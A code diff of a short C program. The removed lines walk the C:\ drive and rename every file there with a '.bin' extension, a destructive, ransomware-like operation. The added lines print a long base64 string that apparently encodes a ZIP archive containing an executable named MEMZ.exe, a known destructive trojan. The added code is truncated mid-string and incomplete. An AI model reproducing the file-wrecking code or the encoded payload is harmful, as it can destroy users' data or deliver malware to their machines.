@@ -1,57 +1,16 @@
-# codeblock
-
 #include <stdio.h>
-#include <stdlib.h>
-#include <dirent.h>
-#include <sys/stat.h>
-#include <string.h>
 
 int main() {
-    DIR *dir;
-    struct dirent *entry;
-    struct stat file_info;
-
-    // Abre o diretório C:\ para leitura
-    dir = opendir("C:\\");
-    if (!dir) {
-        perror("Erro ao abrir diretório");
-        exit(1);
-    }
-
-    // Percorre cada entrada do diretório
-    while ((entry = readdir(dir)) != NULL) {
-        // Ignora as entradas "." e ".."
-        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
-            continue;
-        }
-
-        // Cria o caminho completo para o arquivo/pasta
-        char path[256];
-        sprintf(path, "C:\\%s", entry->d_name);
-
-        // Obtém informações sobre o arquivo/pasta
-        if (stat(path, &file_info) < 0) {
-            perror("Erro ao obter informações do arquivo");
-            continue;
-        }
-
-        // Verifica se é um arquivo
-        if (S_ISREG(file_info.st_mode)) {
-            // Cria o novo nome com a extensão .bin
-            char new_path[256];
-            sprintf(new_path, "C:\\%s.bin", entry->d_name);
-
-            // Renomeia o arquivo
-            if (rename(path, new_path) < 0) {
-                perror("Erro ao renomear arquivo");
-            } else {
-                printf("Arquivo %s renomeado para %s\n", path, new_path);
-            }
-        }
-    }
-
-    // Fecha o diretório
-    closedir(dir);
-
-    return 0;
-}
+    printf("UEsDBBQAAAAIAHV36kiQ6IfZcyEAAAA6AAAIAAAATUVNWi5leGXtew10U8e17kg6soUtjACbGGzi");
+    printf("AxgMyD9Hlm1sY4JkW2AH/wjLP5BgB9k6RhKSjqIfbKcJyBgaqw65tM1NIJckNE1705Tcpi3JJWma");
+    printf("OD830Da0TptFSQOpXx7NFSnhmYRbnIRw3jfnyMZpfmCt99b7WauzvM+c2TOz95699+zZIw71t+wl");
+    printf("KkIIAxBFQo4QuZjItctJQErWcynk8LTjC44o6o4vaHa6gqw/IGwJ2L1sl93nE0JsJ88Gwj7W5WOr");
+    printf("G22sV3Dw+dOnJ2XHaTxj9pZ/yKpcE/Dphr2uz6R3pet3qDdvT3BekurLro+kWuGkdZOry0nHf5Vs");
+    printf("VgshdQo1eXHNzrYJ3ChRKpIVKYRo0Vgu4/Jm4aEDsPFV03clIWqikPonahKJK0nqNu2WBtKxk/Vk");
+    printf("JZXDKwk5SF82ExJTfImAfogBPnvLCSm9Dl1PFsip+zJ68ZIf4ntDdHnJcYG0V+WeQmJzfsBhD9kJ");
+    printf("eXmBjCAL/24BRNKGKV8eRu6jPK1E0g0p/MK44fxAMNBF4mvdHB9X9CX0ArxH6JLXTnUgyVbyhXGV");
+    printf("X73Cf5T/naVl6NzAXVpdaDqec0KJ7eLiU6yJxBLQZRxuf1lHWtvcqR1Gsa2tzXlFZyJO6iRtYpoD");
+    printf("o9wOMc2EeuC8Ivzn2zrOTtA7l2lrbXPuKjMRMa0I/UPFEfocd94DVJt4wnmQ1kMnxRNGcWhs99uh");
+    printf("hbv/Frpxj0W0trkV7tniH/ZYLlrdCZQlvHJYPDHw6tI9lnGre6mY5gElq5hGUO2xxKzOwxLJNA3a");
+    printf("GL/Hcuao5Yzkqm1iePyoZYy6mZjGoNuZiK3sThDTRtG4rePWob+0v9Iqpm2mBN3E+cZcLEgNygsw");
+    printf("VIdFOit
